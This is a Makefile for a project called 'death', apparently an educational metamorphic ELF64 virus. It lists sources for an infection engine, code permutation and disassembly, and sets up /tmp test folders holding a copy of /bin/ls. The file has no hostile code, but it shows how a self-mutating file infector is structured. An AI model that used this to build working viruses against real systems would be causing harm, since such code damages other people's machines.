
# ----------------------------------- Bin ------------------------------------ #

NAME = death

# SRC File order matters!
# [LOADER]    loader_entry -> virus
# [VIRUS]     virus        -> _start
# [LAUNCHER]  _start       -> EOF

SRC =	loader.s                       \
	virus/virus.c                  \
	virus/accessors.c              \
	virus/adjust_references.c      \
	virus/copy_virus_to_clone.c    \
	virus/copy_client_to_clone.c   \
	virus/disasm_block.c           \
	virus/disasm_jumps.c           \
	virus/disasm_length.c          \
	virus/elf64_iterators.c        \
	virus/file_iterator.c          \
	virus/find_entry.c             \
	virus/generate_seed.c          \
	virus/infect.c                 \
	virus/infection_engine.c       \
	virus/logs.c                   \
	virus/metamorph_clone.c        \
	virus/permutate_blocks.c       \
	virus/permutate_registers.c    \
	virus/random.c                 \
	virus/setup_virus_header.c     \
	virus/syscall.c                \
	virus/utils.c                  \
	virus/write_jump.c             \
	start.c

CC = clang
AS = nasm

SRCDIR = srcs
OBJDIR = objs

OBJC = $(addprefix ${OBJDIR}/, $(SRC:.c=.o))
OBJ = $(OBJC:.s=.o)

DEP = $(addprefix ${OBJDIR}/, $(SRC:.c=.d))

override CFLAGS += -Wall -Wextra -MMD  \
	-fno-stack-protector           \
	-nodefaultlibs                 \
	-fno-builtin -nostdlib -fpic

override ASFLAGS += -f elf64

LDFLAGS = -Iincludes/ -nostdlib -fpic

# ---------------------------------- Colors ---------------------------------- #

BY = "\033[33;1m"
BR = "\033[31;1m"
BG = "\033[32;1m"
BB = "\033[34;1m"
BM = "\033[35;1m"
BC = "\033[36;1m"
BW = "\033[37;1m"
Y = "\033[33m"
R = "\033[31m"
G = "\033[32m"
B = "\033[34m"
M = "\033[35m"
C = "\033[36m"
W = "\033[0m""\033[32;1m"
WR = "\033[0m""\033[31;5m"
WY = "\033[0m""\033[33;5m"
X = "\033[0m"
UP = "\033[A"
CUT = "\033[K"

# ---------------------------------- Rules ----------------------------------- #

all: art ${NAME}

${NAME}: ${OBJ}
	@echo ${B}Compiling [${NAME}]...${X}
	@${CC} ${LDFLAGS} -o $@ ${OBJ}
	@echo ${G}Success"   "[${NAME}]${X}
	mkdir -p /tmp/test /tmp/test2
	cp /bin/ls /tmp/test/

${OBJDIR}/%.o: ${SRCDIR}/%.s
	@echo ${Y}Compiling [$@]...${X}
	@/bin/mkdir -p ${OBJDIR} ${OBJDIR}/virus
	@${AS} ${ASFLAGS} -o $@ $<
	@printf ${UP}${CUT}

${OBJDIR}/%.o: ${SRCDIR}/%.c
	@echo ${Y}Compiling [$@]...${X}
	@/bin/mkdir -p ${OBJDIR} ${OBJDIR}/virus
	@${CC} ${CFLAGS} ${LDFLAGS} -c -o $@ $<
	@printf ${UP}${CUT}

# ---------------------------------- Debug ----------------------------------- #

logs: fclean
	${MAKE} all CFLAGS:="-DLOGS -g" ASFLAGS:="-DLOGS -g"

errors: fclean
	${MAKE} all CFLAGS:="-DERRORS -g" ASFLAGS:="-DERRORS -g"

debug: fclean
	${MAKE} all CFLAGS:="-DDEBUG -g" ASFLAGS:="-DDEBUG -g"

# --------------------------------- General ---------------------------------- #

clean:
	@echo ${R}Cleaning"  "[objs]...${X}
	@/bin/rm -Rf ${OBJDIR}

fclean: clean
	@echo ${R}Cleaning"  "[${NAME}]...${X}
	@/bin/rm -f ${NAME}
	@/bin/rm -Rf ${NAME}.dSYM
	@/bin/rm -f /tmp/test/* /tmp/test2/*

re: fclean all

# -------------------------------- Decoration -------------------------------- #

art:
	@echo ${BB}
	@echo "           /\\ .-\"\"\"-. /\\ "
	@echo "           \\ \`\"\`'v'\`\"\` / "
	@echo "           { .=.   .=. } "
	@echo "           {( "${WR}"O"${X}${BB}" ) ( "${WR}"O"${X}${BB}" )} "
	@echo "           .\\'=' V '='/. "
	@echo "          /.'\`-'-'-'-\`'.\\ "
	@echo "         |/   ^  ~  ^   \\| "
	@echo "         \\|    ^   ^    |/ "
	@echo "          \\\\\\           // "
	@echo "           \\\\\\ _     _ // "
	@echo "      "${BG}" -----"${BB}"'(|)"${BG}"---"${BB}"(|)'"${BG}"----- "
	@echo "       ------"${BB}","${BG}"-------"${BB}","${BG}"----- "${BB}
	@echo "            / .' : '. \\ "
	@echo "           '-'._.-._.'-' "
	@echo ${X}

.PHONY: all clean fclean re logs errors debug art

-include ${DEP}
